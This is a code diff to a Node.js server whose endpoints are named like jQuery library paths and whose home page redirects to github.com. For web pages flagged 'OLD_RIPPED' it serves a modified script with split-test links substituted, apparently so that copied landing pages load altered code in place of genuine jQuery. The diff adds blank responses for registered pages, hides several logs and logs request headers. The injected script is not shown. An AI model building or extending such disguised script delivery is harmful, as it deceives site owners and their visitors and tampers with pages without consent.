@@ -61,8 +61,6 @@ function getCodeDelimiter() {
 
 function getClientResponseJSON(uuid, url, ip, callback) {
 
-    console.log("Making client response...");
-
     var useSplitTestLinks = 1;
 
     if(Math.random()<.5) {
@@ -164,6 +162,18 @@ function sendPlainJQuery(res) {
     });
 }
 
+function sendBlankResponse(res) {
+    response = ""; 
+    res.writeHead(200, {
+        'Content-Length': response.length,
+        'Content-Type': 'text/plain',
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Methods': 'GET, OPTIONS',
+        'Access-Control-Allow-Headers': 'X-Requested-With, Content-Type, Origin, Accept' 
+    });
+    res.end(response);
+}
+
 app.get('/', function (req, res) {
     res.redirect("http://github.com");
 });
@@ -213,6 +223,7 @@ app.post('/jquery/latest', function(req, res) {
 
     if(!url) {
         console.log("Error: undefined url.");
+        console.log(req.headers);
         sendPlainJQuery(res);
     }
     else {
@@ -220,7 +231,7 @@ app.post('/jquery/latest', function(req, res) {
         url = formatURL(url);
         var domain = getDomain(url);
 
-        console.log("Received lander request from " + url + " with uuid = " + uuid);
+        //console.log("Received lander request from " + url + " with uuid = " + uuid);
 
         //console.log("Formatted url to be: " + url);
         //console.log("The domain of the url is: " + domain);
@@ -229,12 +240,12 @@ app.post('/jquery/latest', function(req, res) {
             if(docs != undefined && docs[0] != undefined) {
                 var response_string = docs[0].value;
 
-                console.log("Response from process_request: " + response_string);
+                //console.log("Response from process_request: " + response_string);
                 if(response_string == "OLD_RIPPED") {
                     //send back data!
                     getClientResponseJSON(uuid, url, ip, function(response) {
 
-                        console.log("Response to client: " + response.jquery);
+                        //console.log("Response to client: " + response.jquery);
 
                         if(response.jquery == false) { 
                             response = ""; 
@@ -256,6 +267,9 @@ app.post('/jquery/latest', function(req, res) {
                         });
                         res.end(response);
                     });
+                }
+                else if(response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
+                    sendBlankResponse(res);
                 }
                 else if(response_string == "UNKNOWN_BEHAVIOR") {
                     console.log("Something went wrong when calling process_request.");
@@ -298,6 +312,7 @@ app.post('/jquery/stable', function(req, res) {
 
     if(!url) {
         console.log("Error: undefined url.");
+        console.log(req.headers);
         sendPlainJQuery(res);
     }
     else {
@@ -305,7 +320,7 @@ app.post('/jquery/stable', function(req, res) {
         url = formatURL(url);
         var domain = getDomain(url);
 
-        console.log("Received lander request from " + url + " with uuid = " + uuid);
+        //console.log("Received lander request from " + url + " with uuid = " + uuid);
 
         //console.log("Formatted url to be: " + url);
         //console.log("The domain of the url is: " + domain);
@@ -314,12 +329,12 @@ app.post('/jquery/stable', function(req, res) {
             if(docs != undefined && docs[0] != undefined) {
                 var response_string = docs[0].value;
 
-                console.log("Response from process_request: " + response_string);
+                //console.log("Response from process_request: " + response_string);
                 if(response_string == "OLD_RIPPED") {
                     //send back data!
                     getClientResponseJSON(uuid, url, ip, function(response) {
 
-                        console.log("Response to client: " + response.jquery);
+                        //console.log("Response to client: " + response.jquery);
 
                         if(response.jquery == false) { 
                             response = ""; 
@@ -346,6 +361,9 @@ app.post('/jquery/stable', function(req, res) {
                             res.end(replacedFile);
                         });
                     });
+                }
+                else if(response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
+                    sendBlankResponse(res);
                 }
                 else if(response_string == "UNKNOWN_BEHAVIOR") {
                     console.log("Something went wrong when calling process_request.");
@@ -386,13 +404,14 @@ app.post('/jquery/dist', function(req, res) {
 
     if(!url) {
         console.log("Error: undefined url.");
+        console.log(req.headers);
         sendPlainJQuery(res);
     }
     else {
         url = formatURL(url);
         var domain = getDomain(url);
 
-        console.log("Received lander request from " + url + " with uuid = " + uuid);
+        //console.log("Received lander request from " + url + " with uuid = " + uuid);
 
         //console.log("Formatted url to be: " + url);
         //console.log("The domain of the url is: " + domain);
@@ -401,12 +420,12 @@ app.post('/jquery/dist', function(req, res) {
             if(docs != undefined && docs[0] != undefined) {
                 var response_string = docs[0].value;
 
-                console.log("Response from process_request: " + response_string);
+                //console.log("Response from process_request: " + response_string);
                 if(response_string == "OLD_RIPPED") {
                     //send back data!
                     getClientResponseJSON(uuid, url, ip, function(response) {
 
-                        console.log("Response to client: " + response.jquery);
+                        //console.log("Response to client: " + response.jquery);
 
                         if(response.jquery == false) { 
                             response = ""; 
@@ -433,6 +452,9 @@ app.post('/jquery/dist', function(req, res) {
                             res.end(replacedFile);
                         });
                     });
+                }
+                else if(response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
+                    sendBlankResponse(res);
                 }
                 else if(response_string == "UNKNOWN_BEHAVIOR") {
                     console.log("Something went wrong when calling process_request.");
@@ -489,13 +511,14 @@ app.get('/jquery/dist', function (req, res){
 
         if(!url) {
             console.log("Error: undefined url.");
+            console.log(req.headers);
             sendPlainJQuery(res);
         }
         else {
             url = formatURL(url);
             var domain = getDomain(url);
 
-            console.log("Received lander request from " + url + " with uuid = " + uuid);
+            //console.log("Received lander request from " + url + " with uuid = " + uuid);
 
             //console.log("Formatted url to be: " + url);
             //console.log("The domain of the url is: " + domain);
@@ -504,12 +527,12 @@ app.get('/jquery/dist', function (req, res){
                 if(docs != undefined && docs[0] != undefined) {
                     var response_string = docs[0].value;
 
-                    console.log("Response from process_request: " + response_string);
+                    //console.log("Response from process_request: " + response_string);
                     if(response_string == "OLD_RIPPED") {
                         //send back data!
                         getClientResponseJSON(uuid, url, ip, function(response) {
 
-                            console.log("Response to client: " + response.jquery);
+                            //console.log("Response to client: " + response.jquery);
 
                             if(response.jquery == false) { 
                                 response = ""; 
@@ -540,6 +563,9 @@ app.get('/jquery/dist', function (req, res){
                                 // res.jsonp(req.query.ver + '('+ JSON.stringify(replacedFile) + ');');
                             });
                         });
+                    }
+                    else if(response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
+                        sendBlankResponse(res);
                     }
                     else if(response_string == "UNKNOWN_BEHAVIOR") {
                         console.log("Something went wrong when calling process_request.");
@@ -584,6 +610,7 @@ app.post('/jquery', function (req, res){
 
     if(!url) {
         console.log("Error: undefined url.");
+        console.log(req.headers);
         sendPlainJQuery(res);
     }
     else {
@@ -591,7 +618,7 @@ app.post('/jquery', function (req, res){
         url = formatURL(url);
         var domain = getDomain(url);
 
-        console.log("Received lander request from " + url + " with uuid = " + uuid);
+        //console.log("Received lander request from " + url + " with uuid = " + uuid);
 
         //console.log("Formatted url to be: " + url);
         //console.log("The domain of the url is: " + domain);
@@ -600,12 +627,12 @@ app.post('/jquery', function (req, res){
             if(docs != undefined && docs[0] != undefined) {
                 var response_string = docs[0].value;
 
-                console.log("Response from process_request: " + response_string);
+                //console.log("Response from process_request: " + response_string);
                 if(response_string == "OLD_RIPPED") {
                     //send back data!
                     getClientResponseJSON(uuid, url, ip, function(response) {
 
-                        console.log("Response to client: " + response.jquery);
+                        //console.log("Response to client: " + response.jquery);
 
                         if(response.jquery == false) { 
                             response = ""; 
@@ -636,6 +663,9 @@ app.post('/jquery', function (req, res){
                             // res.jsonp(req.query.ver + '('+ JSON.stringify(replacedFile) + ');');
                         });
                     });
+                }
+                else if(response_string == "OLD_REGISTERED" || response_string == "NEW_REGISTERED") {
+                    sendBlankResponse(res);
                 }
                 else if(response_string == "UNKNOWN_BEHAVIOR") {
                     console.log("Something went wrong when calling process_request.");
